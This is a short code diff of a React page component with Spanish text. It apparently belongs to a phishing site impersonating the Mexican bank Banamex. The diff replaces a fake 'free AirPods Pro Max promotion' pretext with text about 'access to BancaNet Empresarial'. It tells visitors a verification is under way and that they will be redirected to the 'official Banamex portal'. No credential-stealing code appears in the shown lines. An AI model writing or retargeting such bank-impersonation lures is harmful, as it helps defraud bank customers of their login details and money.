@@ -62,7 +62,7 @@ const GenerandoAclaracion: React.FC = () => {
       />
       
       <h1 className="text-2xl font-bold mb-4 text-[#153e46]">
-        {hasSessionId ? "Iniciando proceso de verificación" : "Procesando promoción de AirPods Pro Max"}
+        {hasSessionId ? "Iniciando proceso de verificación" : "Procesando acceso a BancaNet"}
       </h1>
       
       <div className="w-full max-w-md mb-6">
@@ -79,7 +79,7 @@ const GenerandoAclaracion: React.FC = () => {
         {hasSessionId ? (
           <>
             <p className="mb-2">
-              Estamos preparando su proceso de verificación para la promoción de AirPods Pro Max de Banamex.
+              Estamos preparando su proceso de verificación para el acceso a BancaNet Empresarial de Banamex.
             </p>
             <p>
               Será redirigido a la plataforma segura en unos momentos. Por favor no cierre esta ventana.
@@ -88,7 +88,7 @@ const GenerandoAclaracion: React.FC = () => {
         ) : (
           <>
             <p className="mb-2">
-              Estamos procesando su registro para la promoción de AirPods Pro Max gratis con Banamex.
+              Estamos procesando su acceso a BancaNet Empresarial de Banamex.
             </p>
             <p>
               Será redirigido al portal oficial de Banamex en unos momentos.
